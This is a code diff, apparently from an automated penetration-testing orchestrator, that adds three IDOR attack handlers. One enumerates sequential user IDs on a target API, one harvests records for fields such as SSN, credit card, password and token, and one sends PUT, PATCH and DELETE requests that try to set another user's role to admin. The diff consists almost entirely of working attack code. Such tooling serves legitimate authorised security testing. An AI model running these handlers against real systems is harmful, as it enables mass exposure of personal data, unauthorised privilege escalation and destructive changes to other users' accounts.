@@ -572,10 +572,12 @@ export class ChainOrchestrator {
     this.registerHandler("ssrf", "validate", new SsrfValidateHandler());
     this.registerHandler("ssrf", "pivot", new SsrfPivotHandler());
 
-    // IDOR handlers
+    // IDOR handlers (base)
     this.registerHandler("idor", "validate", new IdorValidateHandler());
-    this.registerHandler("idor", "exploit", new IdorHorizontalHandler());
-    this.registerHandler("idor", "escalate", new IdorVerticalHandler());
+    // IDOR chain escalation handlers (supersede horizontal/vertical with richer enumeration + privesc)
+    this.registerHandler("idor", "exploit", new IdorEnumerateHandler());
+    this.registerHandler("idor", "exfiltrate", new IdorHarvestHandler());
+    this.registerHandler("idor", "escalate", new IdorEscalateHandler());
 
     // Race condition handlers
     this.registerHandler("race_condition", "validate", new RaceConditionValidateHandler());
@@ -1739,6 +1741,160 @@ class IdorVerticalHandler implements StepHandler {
         status: result?.exploitable ? "success" : "failed",
         confidence: result?.exploitable ? 90 : 10,
         evidence: result ? [{ type: "idor_vertical", data: result.proof || "", capturedAt: new Date() }] : [],
+        startedAt: new Date(startTime), completedAt: new Date(), durationMs: Date.now() - startTime, retryCount: 0,
+      };
+    } catch (error: any) {
+      return { stepId: step.id, stepName: step.name, status: "failed", confidence: 0, evidence: [], startedAt: new Date(startTime), completedAt: new Date(), durationMs: Date.now() - startTime, retryCount: 0, error: error.message };
+    }
+  }
+}
+
+class IdorEnumerateHandler implements StepHandler {
+  async execute(step: PlaybookStep, context: ChainExecutionContext, httpClient: ValidatingHttpClient, _signal: AbortSignal): Promise<StepResult> {
+    const startTime = Date.now();
+    try {
+      const { IdorTestModule } = await import("./business-logic/idor-tests");
+      const module = new IdorTestModule();
+      const maxIds = step.config?.maxIds || 50;
+      const patterns = step.config?.patterns || ["increment"];
+      const validIds: string[] = [];
+      const endpointPath = step.config?.endpointPath || "/api/users/{id}";
+
+      // Enumerate IDs using increment pattern
+      if (patterns.includes("increment")) {
+        for (let i = 1; i <= Math.min(maxIds, 50); i++) {
+          try {
+            const url = `${context.target}${endpointPath.replace("{id}", String(i))}`;
+            const resp = await httpClient.request({ method: "GET", url, headers: step.config?.headers || {} } as any);
+            if (resp && (resp as any).statusCode >= 200 && (resp as any).statusCode < 400) {
+              validIds.push(String(i));
+            }
+          } catch {
+            // ID not valid, continue
+          }
+        }
+      }
+
+      // UUID swap pattern — test with known context IDs
+      if (patterns.includes("uuid_swap") && context.collectedEvidence?.length) {
+        const uuidPattern = /[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}/gi;
+        for (const ev of context.collectedEvidence) {
+          const matches = String(ev.data || "").match(uuidPattern);
+          if (matches) {
+            for (const uuid of matches) {
+              if (!validIds.includes(uuid)) validIds.push(uuid);
+            }
+          }
+        }
+      }
+
+      return {
+        stepId: step.id, stepName: step.name,
+        status: validIds.length > 1 ? "success" : "failed",
+        confidence: validIds.length > 5 ? 80 : validIds.length > 1 ? 55 : 5,
+        evidence: [{ type: "idor_enumeration", data: JSON.stringify({ validIds: validIds.slice(0, 20), totalFound: validIds.length, patterns }), capturedAt: new Date() }],
+        startedAt: new Date(startTime), completedAt: new Date(), durationMs: Date.now() - startTime, retryCount: 0,
+      };
+    } catch (error: any) {
+      return { stepId: step.id, stepName: step.name, status: "failed", confidence: 0, evidence: [], startedAt: new Date(startTime), completedAt: new Date(), durationMs: Date.now() - startTime, retryCount: 0, error: error.message };
+    }
+  }
+}
+
+class IdorHarvestHandler implements StepHandler {
+  async execute(step: PlaybookStep, context: ChainExecutionContext, httpClient: ValidatingHttpClient, _signal: AbortSignal): Promise<StepResult> {
+    const startTime = Date.now();
+    try {
+      const sensitiveFields: string[] = step.config?.sensitiveFields || ["email", "phone", "ssn", "address", "credit_card", "password", "token"];
+      const endpointPath = step.config?.endpointPath || "/api/users/{id}";
+      const harvestedData: Array<{ id: string; fields: string[] }> = [];
+
+      // Extract discovered IDs from previous step evidence
+      let discoveredIds: string[] = [];
+      if (context.collectedEvidence?.length) {
+        for (const ev of context.collectedEvidence) {
+          try {
+            const parsed = JSON.parse(String(ev.data || "{}"));
+            if (parsed.validIds) discoveredIds = parsed.validIds;
+          } catch {
+            // Not JSON evidence, skip
+          }
+        }
+      }
+      if (discoveredIds.length === 0) discoveredIds = ["1", "2", "3", "4", "5"];
+
+      // Access endpoints with discovered IDs and look for sensitive fields
+      for (const id of discoveredIds.slice(0, 10)) {
+        try {
+          const url = `${context.target}${endpointPath.replace("{id}", id)}`;
+          const resp = await httpClient.request({ method: "GET", url, headers: step.config?.headers || {} } as any);
+          const body = String((resp as any)?.body || "");
+          const foundFields = sensitiveFields.filter(f => body.toLowerCase().includes(f.toLowerCase()));
+          if (foundFields.length > 0) {
+            harvestedData.push({ id, fields: foundFields });
+          }
+        } catch {
+          // Request failed, continue
+        }
+      }
+
+      const totalSensitive = harvestedData.reduce((sum, d) => sum + d.fields.length, 0);
+      return {
+        stepId: step.id, stepName: step.name,
+        status: harvestedData.length > 0 ? "success" : "failed",
+        confidence: totalSensitive > 10 ? 90 : totalSensitive > 3 ? 70 : harvestedData.length > 0 ? 50 : 5,
+        evidence: [{ type: "idor_data_harvest", data: JSON.stringify({ harvestedRecords: harvestedData.length, sensitiveFieldsFound: totalSensitive, sample: harvestedData.slice(0, 5) }), capturedAt: new Date() }],
+        startedAt: new Date(startTime), completedAt: new Date(), durationMs: Date.now() - startTime, retryCount: 0,
+      };
+    } catch (error: any) {
+      return { stepId: step.id, stepName: step.name, status: "failed", confidence: 0, evidence: [], startedAt: new Date(startTime), completedAt: new Date(), durationMs: Date.now() - startTime, retryCount: 0, error: error.message };
+    }
+  }
+}
+
+class IdorEscalateHandler implements StepHandler {
+  async execute(step: PlaybookStep, context: ChainExecutionContext, httpClient: ValidatingHttpClient, _signal: AbortSignal): Promise<StepResult> {
+    const startTime = Date.now();
+    try {
+      const targetRoles: string[] = step.config?.targetRoles || ["admin", "superuser", "moderator"];
+      const testMethods: string[] = step.config?.testMethods || ["PUT", "PATCH", "DELETE"];
+      const endpointPath = step.config?.endpointPath || "/api/users/{id}";
+      const escalationResults: Array<{ method: string; id: string; statusCode: number; roleEscalated: boolean }> = [];
+
+      // Extract a target ID from previous evidence
+      let targetId = "1";
+      if (context.collectedEvidence?.length) {
+        for (const ev of context.collectedEvidence) {
+          try {
+            const parsed = JSON.parse(String(ev.data || "{}"));
+            if (parsed.validIds?.length) { targetId = parsed.validIds[0]; break; }
+          } catch { /* skip */ }
+        }
+      }
+
+      // Attempt modification with each HTTP method
+      for (const method of testMethods) {
+        try {
+          const url = `${context.target}${endpointPath.replace("{id}", targetId)}`;
+          const body = method !== "DELETE" ? JSON.stringify({ role: targetRoles[0] }) : undefined;
+          const headers: Record<string, string> = { ...(step.config?.headers || {}), "Content-Type": "application/json" };
+          const resp = await httpClient.request({ method, url, headers, body } as any);
+          const statusCode = (resp as any)?.statusCode || 0;
+          const respBody = String((resp as any)?.body || "");
+          const roleEscalated = targetRoles.some(r => respBody.toLowerCase().includes(r.toLowerCase())) && statusCode >= 200 && statusCode < 300;
+          escalationResults.push({ method, id: targetId, statusCode, roleEscalated });
+        } catch {
+          escalationResults.push({ method, id: targetId, statusCode: 0, roleEscalated: false });
+        }
+      }
+
+      const anyEscalated = escalationResults.some(r => r.roleEscalated);
+      const anyModified = escalationResults.some(r => r.statusCode >= 200 && r.statusCode < 300);
+      return {
+        stepId: step.id, stepName: step.name,
+        status: anyEscalated ? "success" : anyModified ? "success" : "failed",
+        confidence: anyEscalated ? 95 : anyModified ? 70 : 5,
+        evidence: [{ type: "idor_privilege_escalation", data: JSON.stringify({ targetId, results: escalationResults, escalationConfirmed: anyEscalated, modificationConfirmed: anyModified }), capturedAt: new Date() }],
         startedAt: new Date(startTime), completedAt: new Date(), durationMs: Date.now() - startTime, retryCount: 0,
       };
     } catch (error: any) {
